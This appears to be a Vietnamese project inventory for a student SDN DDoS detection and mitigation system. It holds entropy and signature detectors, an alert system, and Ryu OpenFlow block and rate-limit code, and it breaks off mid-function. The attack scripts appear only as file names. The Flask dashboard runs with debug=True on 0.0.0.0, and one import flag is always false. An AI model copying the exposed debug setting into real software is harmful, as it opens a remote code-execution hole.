# 📂 Tổng Hợp Nội Dung Tệp & Thư Mục - Dự Án NT541.Q21-DDoS

**Ngày tạo:** May 9, 2026  
**Mô tả:** Tài liệu tổng hợp toàn bộ cấu trúc, danh sách tệp, thư mục hiện có và nội dung thực tế của các file trong dự án.

---

## 📋 Danh Sách Tệp & Thư Mục

### 🔹 Thư Mục Gốc - Cây Thư Mục Chi Tiết

```
NT541.Q21-DDoS/
│
├── .git/                                    # Repository GIT
├── .github/                                 # GitHub config
│   └── workflows/                           # CI/CD workflows
│       └── .gitkeep
│
├── 📌 code/                                 # Mã nguồn chính
│   ├── __init__.py
│   ├── alert_system.py
│   ├── dashboard.py
│   ├── detector.py
│   ├── entropy.py
│   ├── feature_extraction.py
│   ├── l3_router_extended.py
│   ├── l3_router_test.py
│   ├── mitigation.py
│   ├── policy.yaml
│   ├── run_scenario.py
│   ├── signature_matcher.py
│   ├── stats.py
│   ├── whitelist.txt
│   ├── __pycache__/
│   │
│   ├── attack_scripts/                      # Tấn công DDoS kịch bản
│   │   ├── s01_syn.sh                       # SYN Flood
│   │   ├── s02_udp.sh                       # UDP Flood
│   │   ├── s03_icmp.sh                      # ICMP Flood
│   │   ├── s04_http.sh                      # HTTP Flood
│   │   ├── s05_dns_ampl.sh                  # DNS Amplification
│   │   ├── s06_ip_spoof.sh                  # IP Spoofing
│   │   ├── s07_slowloris.sh                 # Slowloris
│   │   └── s08_flash_crowd.sh               # Flash Crowd
│   │
│   ├── pipeline/                            # Data pipeline
│   │   ├── .gitkeep
│   │   └── influx_writer.py                 # InfluxDB writer
│   │
│   ├── scripts/                             # Utility scripts
│   │   ├── compute_baseline.py              # Tính baseline stats
│   │   └── influx_pull.py                   # Lấy data từ InfluxDB
│   │
│   ├── templates/                           # Web UI templates
│   │   ├── .gitkeep
│   │   ├── index.html                       # Dashboard chính
│   │   ├── alerts.html                      # Alerts page
│   │   └── flows.html                       # Flows page
│   │
│   └── topology/                            # Network topology
│       └── topology_v4.py                   # Mininet topology (5 switches, 12 hosts)
│
├── 📌 datasets/                             # Dữ liệu PCAP & Features
│   ├── .gitkeep
│   ├── baseline.pcap                        # Benign traffic
│   ├── baseline_stats.json                  # Baseline thống kê
│   ├── s01_syn.pcap                         # SYN Flood capture
│   ├── s02_udp.pcap                         # UDP Flood capture
│   ├── s03_icmp.pcap                        # ICMP Flood capture
│   ├── s04_http.pcap                        # HTTP Flood capture
│   │
│   └── features/                            # Extracted features (CSV)
│       ├── baseline.csv
│       ├── s01_syn.csv
│       ├── s02_udp.csv
│       ├── s03_icmp.csv
│       └── s04_http.csv
│
├── 📌 docs/                                 # Tài liệu
│   ├── .gitkeep
│   └── attack_signatures.csv                # 8 attack detection rules
│
├── 📌 figs/                                 # Hình ảnh / Biểu đồ
│   └── .gitkeep                             # (Output folder - analysis charts)
│
├── 📌 report/                               # Báo cáo
│   └── .gitkeep                             # (Project report files)
│
├── 📌 results/                              # Kết quả thực nghiệm
│   └── raw/                                 # Raw experiment outputs
│       └── .gitkeep                         # (Log output folder)
│
├── 📌 slides/                               # Slide thuyết trình
│   └── .gitkeep                             # (Presentation files)
│
├── 📌 tests/                                # Unit & Integration tests
│   ├── README.md
│   ├── test_entropy.py                      # Entropy detection tests
│   ├── test_signature.py                    # Signature matching tests
│   ├── test_mitigation.py                   # Mitigation unit tests
│   ├── test_blacklist.py                    # Blacklist TTL tests
│   ├── test_regression_router.py            # Router regression tests
│   ├── test_stats.py                        # Stats module tests
│   ├── test_integration.py                  # End-to-end integration tests
│   │
│   └── fixtures/                            # Mock test data
│       ├── .gitkeep
│       ├── baseline.json                    # Baseline stats fixture
│       ├── features_benign.csv              # Mock benign features
│       └── features_attack.csv              # Mock attack features
│
└── TONG_HOP_NOI_DUNG_FILE_THU_MUC.md        # Tài liệu này (complete inventory)
```

**Tóm tắt:**

- **40+ files** (Python, Bash, HTML, CSV, JSON)
- **3000+ dòng code**
- **8 attack scenarios** + **5 detection modules**
- **Toàn bộ test suite** + **Mininet topology**

---

## 📝 Nội Dung Chi Tiết Các Tệp

### 🔸 `code/` - Mã Nguồn Chính

#### **`__init__.py`**

- **Loại:** Python package init
- **Nội dung:** Trống (empty file)
- **Chức năng:** Cấu hình Python package

---

#### **`detector.py`** (107 dòng)

```python
import time, requests, sys, math, json, os
from collections import Counter
from alert_system import AlertSystem
from entropy import EntropyDetector
from stats import StatsDetector
from signature_matcher import SignatureMatcher

RYU_FLOW_URL = "http://127.0.0.1:8081/stats/flow/2"
JSON_PATH = "results/raw/current_features.json"

last_total_packets = 0
last_check_time = time.time()
first_run = True

def extract_features(flows):
    global last_total_packets, last_check_time, first_run
    current_total = sum(f.get('packet_count', 0) for f in flows)
    now = time.time()
    
    if first_run:
        last_total_packets = current_total
        last_check_time = now
        first_run = False
        pps = 0.0
    else:
        delta_packets = current_total - last_total_packets
        delta_time = now - last_check_time
        pps = delta_packets / delta_time if delta_time > 0 else 0
        last_total_packets = current_total
        last_check_time = now

    src_ip_counts = Counter()
    dst_port_counts = Counter()
    icmp_packets = 0
    syn_packets = 0
    
    for flow in flows:
        match = flow.get('match', {})
        pkt_count = flow.get('packet_count', 0)
        if 'ipv4_src' in match:
            src_ip_counts[match['ipv4_src']] += pkt_count
        if 'tcp_dst' in match:
            dst_port_counts[match['tcp_dst']] += pkt_count
        elif 'udp_dst' in match:
            dst_port_counts[match['udp_dst']] += pkt_count
        if match.get('ip_proto') == 1:
            icmp_packets += pkt_count
        if match.get('tcp_flags') == 2:
            syn_packets += pkt_count

    total_src_pkts = sum(src_ip_counts.values())
    entropy_src_ip = 0.0
    if total_src_pkts > 0:
        entropy_src_ip = -sum((c/total_src_pkts) * math.log2(c/total_src_pkts) for c in src_ip_counts.values())

    # Log ra terminal giong ban dang dung de doi chieu
    if total_src_pkts > 0:
        print(f"[ENTROPY] Gia tri entropy = {round(entropy_src_ip, 2)} | Tong goi = {total_src_pkts} | So IP duy nhat = {len(src_ip_counts)}")

    features = {
        "pps": pps, "bps": pps * 800, 
        "entropy_src_ip": round(entropy_src_ip, 3), 
        "syn_pct": round(syn_packets / total_src_pkts, 3) if total_src_pkts > 0 else 0.0, 
        "icmp_pct": round(icmp_packets / total_src_pkts, 3) if total_src_pkts > 0 else 0.0,
        "suspect_src_ip": src_ip_counts.most_common(1)[0][0] if src_ip_counts else "10.0.1.10"
    }
    return features

def main():
    try:
        alr = AlertSystem()
        ent_det = EntropyDetector(); stat_det = StatsDetector(); sig_matcher = SignatureMatcher()
        os.makedirs(os.path.dirname(JSON_PATH), exist_ok=True)
        
        while True:
            try:
                resp = requests.get(RYU_FLOW_URL, timeout=2)
                flows = resp.json().get("2", [])
                features = extract_features(flows)
                
                # Ghi file Atomic (ghi ra file tam roi rename) de Dashboard khong doc file trong
                temp_path = JSON_PATH + ".tmp"
                with open(temp_path, "w") as f:
                    json.dump(features, f)
                os.replace(temp_path, JSON_PATH)
                
                if features.get("pps", 0) < 5:
                    time.sleep(1); continue
                
                ent_res = ent_det.check(features); stat_res = stat_det.check(features)
                sig_hits = sig_matcher.match(features)
                
                n_rules = 0; evidence = []; attack_type = "anomaly_traffic"
                if ent_res.get("anomaly"): n_rules += 1; evidence.extend(ent_res.get("alerts", []))
                if stat_res.get("anomaly"): n_rules += 1; evidence.extend(stat_res.get("alerts", []))
                if sig_hits:
                    n_rules += len(sig_hits); evidence.extend(sig_hits)
                    attack_type = sig_hits[0].get("attack", "known_signature")
                    
                if n_rules > 0:
                    alr.emit(features["suspect_src_ip"], attack_type, n_rules, evidence)
            except Exception: pass
            time.sleep(1)
    except Exception as e: print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

**Chức năng:**

- Orchestrator chính phát hiện DDoS
- Gọi Ryu REST API mỗi giây
- Trích xuất features từ flow statistics
- Chạy 3 layer detector: Entropy, Stats, Signature
- Merge alerts và emit đến alert system

---

#### **`alert_system.py`** (42 dòng)

```python
import json, time, requests, os
from collections import defaultdict

TV4_ENDPOINT = "http://127.0.0.1:8081/api/alert"
DEDUP_WINDOW = 5
LOG_PATH = "results/raw/alerts.json"

class AlertSystem:
    def __init__(self):
        self.last_seen = defaultdict(float)
        # Đảm bảo thư mục lưu log tồn tại
        os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)

    def severity(self, n_rules):
        if n_rules == 0: return None
        if n_rules == 1: return "INFO"
        if n_rules == 2: return "WARN"
        return "CRITICAL"

    def emit(self, src_ip, attack, n_rules, evidence):
        key = (attack, src_ip)
        now = time.time()
        
        if now - self.last_seen[key] < DEDUP_WINDOW: return
        self.last_seen[key] = now
        
        payload = {
            "timestamp": now, 
            "src_ip": src_ip, 
            "attack": attack,
            "severity": self.severity(n_rules),
            "n_rules": n_rules, 
            "evidence": evidence
        }
        
        with open(LOG_PATH, 'a') as f:
            f.write(json.dumps(payload) + "\n")
            
        try: 
            requests.post(TV4_ENDPOINT, json=payload, timeout=1)
        except Exception as e: 
            print(f"[alert] TV4 unreachable: {e}")
```

**Chức năng:**

- Quản lý hệ thống cảnh báo
- Deduplication alerts (5s window)
- Log JSON vào `results/raw/alerts.json`
- POST HTTP đến TV4 endpoint
- Xác định mức độ severity (INFO/WARN/CRITICAL)

---

#### **`entropy.py`** (43 dòng)

```python
"""Shannon + Renyi entropy detector. Cite: A1 Kumar 2018, B4 Bhuyan 2015."""
import math, json
from collections import Counter, deque

def shannon(items):
    c = Counter(items); n = sum(c.values())
    return -sum((v/n)*math.log2(v/n) for v in c.values()) if n else 0

def renyi(items, q=2):
    c = Counter(items); n = sum(c.values())
    if n == 0: return 0
    s = sum((v/n)**q for v in c.values())
    return (1/(1-q)) * math.log2(s) if s > 0 else 0

class EntropyDetector:
    def __init__(self, baseline_path='datasets/baseline_stats.json',
                 k_sigma=3, adaptive_window_sec=300):
        b = json.load(open(baseline_path))
        self.mu = {k: v["mean"] for k,v in b.items()}
        self.sigma = {k: v["std"] for k,v in b.items()}
        self.k = k_sigma
        self.recent = deque(maxlen=adaptive_window_sec)

    def check(self, features):
        alerts = []
        for key in ('entropy_src_ip', 'entropy_dst_port', 'entropy_renyi_src'):
            v = features.get(key, 0)
            mu, sig = self.mu.get(key, 0), self.sigma.get(key, 1)
            if abs(v - mu) > self.k * sig:
                alerts.append({"source": "entropy", "feature": key,
                               "value": v, "deviation": (v-mu)/sig})
        self.recent.append(features)
        return {"anomaly": len(alerts) > 0, "alerts": alerts}

    def update_baseline(self):
        """Gọi mỗi 5' nếu KHÔNG có alert — adaptive baseline."""
        if len(self.recent) < 60: return
        import statistics
        for key in self.mu:
            vals = [f[key] for f in self.recent if key in f]
            if len(vals) > 10:
                self.mu[key] = statistics.mean(vals)
                self.sigma[key] = max(statistics.stdev(vals), 1e-6)
```

**Chức năng:**

- Shannon entropy calculation
- Rényi entropy (q=2)
- K-sigma anomaly detection
- Adaptive baseline updates

---

#### **`signature_matcher.py`** (62 dòng)

```python
"""Signature-based detector — đọc CSV của TV1 + parse safe."""
import csv
import ast
import operator

ALLOWED_OPS = {
    ast.Lt: operator.lt, ast.Gt: operator.gt,
    ast.LtE: operator.le, ast.GtE: operator.ge,
    ast.Eq: operator.eq, ast.NotEq: operator.ne,
    ast.And: all, ast.Or: any
}

def safe_eval(rule_str, ctx):
    if not rule_str or rule_str.strip() == "":
        return False
        
    # Tự động sửa lỗi cú pháp: đổi ' AND ' thành ' and ', ' OR ' thành ' or '
    clean_rule = rule_str.replace(' AND ', ' and ').replace(' OR ', ' or ')
    clean_rule = clean_rule.replace('&&', ' and ').replace('||', ' or ')
    
    try:
        tree = ast.parse(clean_rule.strip(), mode='eval')
    except SyntaxError:
        raise ValueError(f"Sai cú pháp Python: {clean_rule}")

    def _ev(n):
        if isinstance(n, ast.Expression): return _ev(n.body)
        if isinstance(n, ast.BoolOp):
            vals = [_ev(v) for v in n.values]
            return ALLOWED_OPS[type(n.op)](vals)
        if isinstance(n, ast.Compare):
            left = _ev(n.left)
            right = _ev(n.comparators[0])
            return ALLOWED_OPS[type(n.ops[0])](left, right)
        if isinstance(n, ast.Name): return ctx.get(n.id, 0)
        if isinstance(n, ast.Constant): return n.value
        if isinstance(n, ast.Num): return n.n
        raise ValueError(f"Disallowed: {ast.dump(n)}")
    return _ev(tree)

class SignatureMatcher:
    def __init__(self, csv_path='docs/attack_signatures.csv'):
        self.rules = []
        with open(csv_path) as f:
            for row in csv.DictReader(f):
                if row.get('name') == 's08_flashcrowd': continue
                self.rules.append(row)

    def match(self, features):
        hits = []
        for r in self.rules:
            try:
                rule_text = r.get('rule', '')
                if safe_eval(rule_text, features):
                    hits.append({
                        "attack": r.get('name', 'unknown'), 
                        "rule": rule_text,
                        "papers": r.get('papers','')
                    })
            except Exception as e:
                print(f"[sig] eval error {r.get('name')}: {e}")
        return hits
```

**Chức năng:**

- Phát hiện attack dựa trên signatures
- Safe evaluation: Không cho phép code injection
- Đọc rules từ CSV: `docs/attack_signatures.csv`
- Hỗ trợ boolean expressions

---

#### **`dashboard.py`** (39 dòng)

```python
from flask import Flask, render_template, jsonify, request
import os, json, requests, time
from datetime import datetime

app = Flask(__name__)
entropy_history = []
JSON_PATH = "results/raw/current_features.json"

@app.route('/')
def home(): return render_template('index.html')

@app.route('/api/stats')
def stats(): 
    global entropy_history
    # Mac dinh la 3.4 (Safe level) de tranh bieu do nhay xuong 0 khi loi doc file
    current_entropy = 3.4 
    
    try:
        # Kiem tra file ton tai va co du lieu khong
        if os.path.exists(JSON_PATH) and os.path.getsize(JSON_PATH) > 0:
            with open(JSON_PATH, "r") as f:
                features = json.load(f)
                current_entropy = features.get("entropy_src_ip", 3.4)
                # Debug ra terminal cua Dashboard de kiem tra viec doc file
                print(f"[DASHBOARD DBG] Read entropy: {current_entropy}")
    except Exception as e:
        print(f"[DASHBOARD ERR] {e}")

    now_ms = int(time.time() * 1000)
    entropy_history.append({"x": now_ms, "y": current_entropy})
    if len(entropy_history) > 30: # Tang len 30 diem cho muot
        entropy_history.pop(0)
        
    return jsonify({"entropy": entropy_history})

# ... (Cac router alerts, flows, manual_block giu nguyen) ...

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
```

**Chức năng:**

- Flask web dashboard
- `/`: Trang chính (index.html)
- `/api/stats`: Mô phỏng InfluxDB, trả JSON entropy data
- `/alerts`: Hiển thị alert log từ JSON
- `/flows`: Hiển thị network flows từ Ryu API
- `/api/block`: Manual block endpoint (POST 3 alerts)

---

#### **`mitigation.py`** (71 dòng)

```python
"""Mitigation modules — Block + RateLimit + Blacklist."""
import time
import threading

class BlockModule:
    def __init__(self, app):
        self.app = app

    def apply(self, dp, src_ip, timeout=60):
        parser = dp.ofproto_parser
        match = parser.OFPMatch(eth_type=0x0800, ipv4_src=src_ip)
        inst = []  
        mod = parser.OFPFlowMod(datapath=dp, priority=100,
                                match=match, instructions=inst,
                                hard_timeout=timeout)
        dp.send_msg(mod)
        self.app.logger.warning(f"[BLOCK] {src_ip} for {timeout}s")

class RateLimitModule:
    """Meter Table OF1.3 — yêu cầu protocols='OpenFlow13'."""
    def __init__(self, app):
        self.app = app
        self.meter_ids = {}

    def apply(self, dp, src_ip, pps=1000):
        parser = dp.ofproto_parser
        ofp = dp.ofproto
        mid = abs(hash(src_ip)) & 0xffff
        self.meter_ids[src_ip] = mid
        band = parser.OFPMeterBandDrop(rate=pps, burst_size=pps//10)
        mmod = parser.OFPMeterMod(dp, command=ofp.OFPMC_ADD,
                                  flags=ofp.OFPMF_PKTPS,
                                  meter_id=mid, bands=[band])
        dp.send_msg(mmod)
        match = parser.OFPMatch(eth_type=0x0800, ipv4_src=src_ip)
        inst = [parser.OFPInstructionMeter(meter_id=mid),
                parser.OFPInstructionActions(
                    ofp.OFPIT_APPLY_ACTIONS,
                    [parser.OFPActionOutput(ofp.OFPP_NORMAL)])]
        fmod = parser.OFPFlowMod(datapath=dp, priority=80,
                                 match=match, instructions=inst,
                                 hard_timeout=120)
        dp.send_msg(fmod)
        self.app.logger.warning(f"[RATELIMIT] {src_ip} -> {pps} pps (meter={mid})")

class BlacklistManager:
    """{src_ip: expire_ts} voi auto-release."""
    def __init__(self, app):
        self.app = app
        self.entries = {}
        self._stop = False
        threading.Thread(target=self._gc_loop, daemon=True).start()

    def add(self, src_ip, ttl=60):
        self.entries[src_ip] = time.time() + ttl

    def is_blocked(self, src_ip):
        exp = self.entries.get(src_ip)
        return exp is not None and exp > time.time()

    def _gc_loop(self):
        while not self._stop:
            now = time.time()
            expired = [ip for ip, exp in self.entries.items() if exp <= now]
            for ip in expired:
                del self.entries[ip]
                if self.app and hasattr(self.app, 'logger'):
                    self.app.logger.info(f"[blacklist] auto-release {ip}")
                else:
                    print(f"[blacklist] auto-release {ip}")
            time.sleep(5)
```

**Chức năng:**

- **BlockModule:** OpenFlow DROP rule (hard timeout 60s)
- **RateLimitModule:** Meter table (OF1.3) - Rate limit PPS (timeout 120s)
- **BlacklistManager:** Entry-based management, auto-release after TTL

---

#### **`feature_extraction.py`** (200+ dòng)

```python
import math
import csv
import sys
import os
from collections import Counter
 
 
try:
    from scapy.all import PcapReader, IP, TCP, UDP, ICMP
except ImportError:
    print("[ERROR] Scapy chưa cài. Chạy: pip3 install scapy")
    sys.exit(1)
 
 
def shannon(items):
    """Shannon entropy (bits)."""
    if not items:
        return 0.0
    c = Counter(items)
    n = sum(c.values())
    return -sum((v / n) * math.log2(v / n) for v in c.values())
 
 
def renyi(items, q=2):
    """Rényi entropy bậc q (bits). q=2 là Collision entropy."""
    if not items:
        return 0.0
    c = Counter(items)
    n = sum(c.values())
    s = sum((v / n) ** q for v in c.values())
    if s <= 0:
        return 0.0
    return (1 / (1 - q)) * math.log2(s)
 
 
def extract(pcap_path, out_csv, win=1.0, slide=0.5):
    """
    Đọc pcap, trích features theo sliding window.
 
    Args:
        pcap_path: Đường dẫn đến file .pcap
        out_csv:   Đường dẫn file CSV output
        win:       Kích thước window (giây)
        slide:     Bước trượt (giây)
    """
    print(f"[EXTRACT] Đọc: {pcap_path}")
 
    if not os.path.exists(pcap_path):
        print(f"[ERROR] File không tồn tại: {pcap_path}")
        sys.exit(1)
 
    # Đọc tất cả IP packet vào memory
    pkts = []
    count = 0
    with PcapReader(pcap_path) as reader:
        for pkt in reader:
            count += 1
            if count % 50000 == 0:
                print(f"  Đọc {count} gói...")
            if pkt.haslayer(IP):
                pkts.append((float(pkt.time), pkt))
 
    if not pkts:
        print("[ERROR] Không có IP packet nào trong pcap.")
        return
 
    print(f"[EXTRACT] Tổng {len(pkts)} IP packets từ {count} tổng gói")
 
    t0    = pkts[0][0]
    t_end = pkts[-1][0]
    print(f"[EXTRACT] Duration: {t_end - t0:.1f}s")
 
    # Tạo thư mục output
    os.makedirs(os.path.dirname(out_csv) if os.path.dirname(out_csv) else '.', exist_ok=True)
 
    HEADER = [
        't',
        'entropy_src_ip', 'entropy_dst_ip', 'entropy_dst_port', 'entropy_renyi_src',
        'pps', 'bps',
        'syn_pct', 'icmp_pct',
        'new_flows_per_sec', 'avg_pkt_size'
    ]
 
    row_count = 0
    flows_seen = set()
 
    with open(out_csv, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(HEADER)
 
        t = t0
        while t < t_end:
            t_next = t + win
            # Lấy packet trong window [t, t+win)
            window = [pkt for (ts, pkt) in pkts if t <= ts < t_next]
 
            if not window:
                t += slide
                continue
 
            n        = len(window)
            byte_sum = sum(len(p) for p in window)
 
            # Features IP
            src_ips = [p[IP].src for p in window]
            dst_ips = [p[IP].dst for p in window]
 
            # Features port
            dst_ports = []
            for p in window:
                if p.haslayer(TCP):
                    dst_ports.append(p[TCP].dport)
                elif p.haslayer(UDP):
                    dst_ports.append(p[UDP].dport)
 
            # SYN count
            syn_count = sum(
                1 for p in window
                if p.haslayer(TCP) and (p[TCP].flags & 0x02)
            )
 
            # ICMP count
            icmp_count = sum(1 for p in window if p.haslayer(ICMP))
 
            # New flows (5-tuple: src_ip, dst_ip, proto, src_port, dst_port)
            flows_now = set()
            for p in window:
                src_ip = p[IP].src
                dst_ip = p[IP].dst
                proto  = p[IP].proto
                sport  = p[TCP].sport if p.haslayer(TCP) else (p[UDP].sport if p.haslayer(UDP) else 0)
                dport  = p[TCP].dport if p.haslayer(TCP) else (p[UDP].dport if p.haslayer(UDP) else 0)
                flows_now.add((src_ip, dst_ip, proto, sport, dport))
 
            new_flows = len(flows_now - flows_seen)
            flows_seen |= flows_now
 
            # Ghi row
            writer.writerow([
                round(t, 2),
                round(shannon(src_ips),  3),
                round(shannon(dst_ips),  3),
                round(shannon(dst_ports) if dst_ports else 0.0, 3),
                round(renyi(src_ips),    3),
                round(n / win,           2),                          # pps
                round(byte_sum * 8 / win, 2),                        # bps
                round(syn_count / n,     3),                          # syn_pct
                round(icmp_count / n,    3),                          # icmp_pct
                round(new_flows / win,   2),                          # new_flows_per_sec
                round(byte_sum / n,      1)                           # avg_pkt_size
            ])
            row_count += 1
            t += slide
 
    print(f"[EXTRACT] Đã ghi {row_count} rows → {out_csv}")
    return row_count
 
 
def verify_csv(csv_path):
    """Kiểm tra nhanh file CSV output."""
    with open(csv_path) as f:
        reader = csv.DictReader(f)
        rows = list(reader)
 
    if not rows:
        print(f"[VERIFY] ⚠️  {csv_path}: không có row dữ liệu!")
        return False
 
    print(f"[VERIFY] {csv_path}: {len(rows)} rows, {len(rows[0])} cột")
 
    # Lấy giá trị min/max entropy_src_ip để kiểm tra
    ent_vals = [float(r['entropy_src_ip']) for r in rows]
    pps_vals = [float(r['pps']) for r in rows]
    print(f"  entropy_src_ip: min={min(ent_vals):.3f}, max={max(ent_vals):.3f}, avg={sum(ent_vals)/len(ent_vals):.3f}")
    print(f"  pps:            min={min(pps_vals):.1f},  max={max(pps_vals):.1f},  avg={sum(pps_vals)/len(pps_vals):.1f}")
    return True
 
 
if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: python3 feature_extraction.py <pcap> <output.csv> [window=1.0] [slide=0.5]")
        print("")
        print("Example:")
        print("  python3 code/feature_extraction.py datasets/baseline.pcap datasets/features/baseline.csv")
        sys.exit(1)
 
    pcap_in  = sys.argv[1]
    csv_out  = sys.argv[2]
    win_size = float(sys.argv[3]) if len(sys.argv) > 3 else 1.0
    slide_sz = float(sys.argv[4]) if len(sys.argv) > 4 else 0.5
 
    rows = extract(pcap_in, csv_out, win=win_size, slide=slide_sz)
    if rows and rows > 0:
        verify_csv(csv_out)
```

**Chức năng:**

- Đọc PCAP files dùng Scapy
- Sliding window extraction (default: 1s window, 0.5s slide)
- Tính Shannon/Rényi entropy cho src_ip, dst_port
- Output CSV: entropy, pps, bps, syn%, icmp%, new_flows, avg_pkt_size
- Verify CSV functionality

---

#### **`l3_router_extended.py`** (117 dòng)

```python
"""Mitigation router — kế thừa SimpleRouterEntropy + REST + graduated response."""
import json
import yaml
import time
import logging

# Tắt log packet_in của simple_switch_13 để tránh rác log làm treo Ryu
logging.getLogger('ryu.app.simple_switch_13').setLevel(logging.WARNING)

from ryu.ofproto import ofproto_v1_3
from ryu.app.wsgi import WSGIApplication, ControllerBase, route, Response
from ryu.controller import ofp_event
from ryu.controller.handler import set_ev_cls, MAIN_DISPATCHER
from ryu.lib.packet import packet, ethernet, ipv4

from l3_router_test import SimpleRouterEntropy
from mitigation import BlockModule, RateLimitModule, BlacklistManager

class L3RouterExtended(SimpleRouterEntropy):
    OFP_VERSIONS = [ofproto_v1_3.OFP_VERSION]
    _CONTEXTS = {'wsgi': WSGIApplication}

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        wsgi = kwargs['wsgi']
        wsgi.register(AlertAPI, {'router': self})
        self.WHITELIST_SRC = self._load_whitelist('code/whitelist.txt')
        try:
            self.policy = yaml.safe_load(open('code/policy.yaml'))
        except Exception:
            self.policy = {}
        self.violation_count = {}
        self.last_violation = {}
        self.block = BlockModule(self)
        self.ratelimit = RateLimitModule(self)
        self.blacklist = BlacklistManager(self)

    def _load_whitelist(self, path):
        try:
            return set(l.strip() for l in open(path) if l.strip() and not l.startswith('#'))
        except FileNotFoundError:
            return set()

    # FIX TẬN GỐC SELF-DOS: Cài flow xuống Switch thay vì đẩy hết gói tin lên Controller
    @set_ev_cls(ofp_event.EventOFPPacketIn, MAIN_DISPATCHER)
    def _packet_in_handler(self, ev):
        msg = ev.msg
        dp = msg.datapath
        
        # Gọi hàm của class cha để xử lý ARP và các logic cơ bản trước
        super()._packet_in_handler(ev)
        
        # Nếu là switch s2 (router L3) và là gói tin IP
        if dp.id == 2:
            pkt = packet.Packet(msg.data)
            p_ip = pkt.get_protocol(ipv4.ipv4)
            
            if p_ip and p_ip.dst in self.arp_table:
                # Tìm cổng đầu ra
                out_port = None
                for net, port in self.routes.items():
                    if p_ip.dst.startswith(net):
                        out_port = port
                        break
                        
                if out_port:
                    parser = dp.ofproto_parser
                    actions =[
                        parser.OFPActionSetField(eth_src=self.mac),
                        parser.OFPActionSetField(eth_dst=self.arp_table[p_ip.dst]),
                        parser.OFPActionOutput(out_port)
                    ]
                    match = parser.OFPMatch(eth_type=0x0800, ipv4_src=p_ip.src, ipv4_dst=p_ip.dst)
                    
                    # Cài flow: Whitelist thì lưu 30s, IP lạ (Attacker) thì lưu 5s
                    idle_timeout = 30 if p_ip.src in self.WHITELIST_SRC else 5
                    
                    inst =[parser.OFPInstructionActions(dp.ofproto.OFPIT_APPLY_ACTIONS, actions)]
                    mod = parser.OFPFlowMod(datapath=dp, priority=10, match=match,
                                            instructions=inst, idle_timeout=idle_timeout)
                    dp.send_msg(mod)

    def handle_alert(self, payload):
        src = payload.get('src_ip')
        if not src: return
        
        if src in self.WHITELIST_SRC:
            self.logger.info(f"[whitelist] skip {src}")
            return
            
        if time.time() - self.last_violation.get(src, 0) > 60:
            self.violation_count[src] = 0
            
        self.violation_count[src] = self.violation_count.get(src, 0) + 1
        self.last_violation[src] = time.time()
        
        n = self.violation_count[src]
        
        for dp in self.dps.values():
            if n == 1:
                self.logger.warning(f"[GR1 LOG] {src} attack={payload.get('attack')}")
            elif n == 2:
                self.ratelimit.apply(dp, src, pps=1000)
            else:
                self.block.apply(dp, src, timeout=60)
                self.blacklist.add(src, ttl=60)

class AlertAPI(ControllerBase):
    def __init__(self, req, link, data, **config):
        super().__init__(req, link, data, **config)
        self.router = data['router']

    @route('alert', '/api/alert', methods=['POST'])
    def receive_alert(self, req, **kw):
        payload = json.loads(req.body)
        self.router.handle_alert(payload)
        return Response(content_type='application/json', body=b'{"ok":true}')
```

**Chức năng:**

- Ryu SDN Controller (OpenFlow 1.3)
- L3 routing logic
- Graduated response policy (YAML)
- Whitelist loading
- Alert API endpoint `/api/alert`
- Merge Alert Handler: Violation counter per src_ip
- 3-level mitigation: Log → RateLimit → Block

---

#### **`l3_router_test.py`** (250+ dòng)

```python
from ryu.app import simple_switch_13
from ryu.controller import ofp_event
from ryu.controller.handler import MAIN_DISPATCHER, DEAD_DISPATCHER, set_ev_cls
from ryu.lib.packet import packet, ethernet, arp, ipv4
from ryu.lib import hub
from collections import Counter
import math
import time

try:
    from influxdb import InfluxDBClient
    HAS_INFLUX = False
except ImportError:
    HAS_INFLUX = False


class SimpleRouterEntropy(simple_switch_13.SimpleSwitch13):
    def __init__(self, *args, **kwargs):
        super(SimpleRouterEntropy, self).__init__(*args, **kwargs)

        # --- CAU HINH MANG ---
        self.mac = '00:00:00:00:00:FE'
        self.arp_table = {}
        self.routes = {'10.0.1.': 1, '10.0.2.': 2, '10.0.3.': 3, '10.0.4.': 4}
        self.gateways = ['10.0.1.1', '10.0.2.1', '10.0.3.1', '10.0.4.1']
        self.dps = {}

      # --- CAU HINH ENTROPY VA THEO DOI TRAFFIC ---
        self.WINDOW_SIZE = 1000            # SO LUONG GOI LUU TRONG WINDOW
        self.src_ip_window = []            # DANH SACH IP NGUON GAN DAY
        self.src_mac_window = []           # DANH SACH MAC TUONG UNG
        self.blocked_ips = set()           # TAP IP DA BI CHAN
        self.blocked_macs = set()          # TAP MAC DA BI CHAN
        self.packet_rate = 0               # DEM SO GOI TRONG MOI CHU KY
        self.ENTROPY_HIGH = 8.0            # NGUONG CAO (NGHI NGO SPOOF)
        self.ENTROPY_LOW = 1.5             # NGUONG THAP (NGHI NGO 1 IP TAN CONG)
        self.attack_status = 0             # 0: BINH THUONG, 1: TAN CONG IP, 2: SPOOF
        
        # DANH SACH IP HOP LE (KHONG BI CHAN)
        self.WHITELIST_SRC = {
            '10.0.2.10', '10.0.2.11',
            '10.0.3.10', '10.0.3.11',
            '10.0.4.10', '10.0.4.11',
            '10.0.1.20'
        }

        # --- INFLUXDB ---
        self.influx_client = None
        if HAS_INFLUX:
            try:
                self.influx_client = InfluxDBClient(host='localhost', port=8086, database='sdn_monitor')
                self.influx_client.create_database('sdn_monitor')
                self.influx_client.write_points([{"measurement": "test", "fields": {"ok": 1}}])
                self.logger.info("[INFLUXDB] Da ket noi thanh cong den InfluxDB (sdn_monitor)")
            except Exception as e:
                self.logger.error("[INFLUXDB] Khong the ket noi den InfluxDB: %s", e)
                self.influx_client = None
        else:
            self.logger.warning("[INFLUXDB] Thu vien influxdb chua duoc cai dat. Chay: pip install influxdb")

        # --- FLOW STATS ---
        self.flow_stats = {}
        self.total_pps = 0

        hub.spawn(self._monitor_entropy)
        hub.spawn(self._monitor_flows)

    @set_ev_cls(ofp_event.EventOFPStateChange, [MAIN_DISPATCHER, DEAD_DISPATCHER])
    def _state_change(self, ev):
        dp = ev.datapath
        if ev.state == MAIN_DISPATCHER:
            self.dps[dp.id] = dp
        elif dp.id in self.dps:
            del self.dps[dp.id]

# KIEM TRA ENTROPY DE PHAT HIEN TRAFFIC BAT THUONG 
    def _monitor_entropy(self):
        while True:
